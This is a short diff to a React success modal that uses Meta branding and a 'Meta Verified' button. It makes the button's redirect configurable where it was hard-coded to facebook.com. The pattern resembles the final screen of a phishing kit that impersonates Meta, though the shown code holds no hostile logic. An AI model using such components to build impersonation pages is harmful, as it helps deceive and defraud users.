@@ -2,6 +2,7 @@ import PropTypes from 'prop-types';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import SuccessImage from '@/assets/images/success-badge.png';
 import TickIcon from '@/assets/images/tick.svg';
+import config from '@/utils/config';
 
 const SuccessModal = ({ show, onClose, texts }) => {
     if (!show) return null;
@@ -42,7 +43,7 @@ const SuccessModal = ({ show, onClose, texts }) => {
                             <button
                                 className="btn btn-primary"
                                 type="button"
-                                onClick={() => window.location.href = 'https://www.facebook.com'}
+                                onClick={() => globalThis.location.href = config.success_redirect_url}
                             >
                                 <span className="button-text">{texts.metaVerified || 'Meta Verified'}</span>
                             </button>
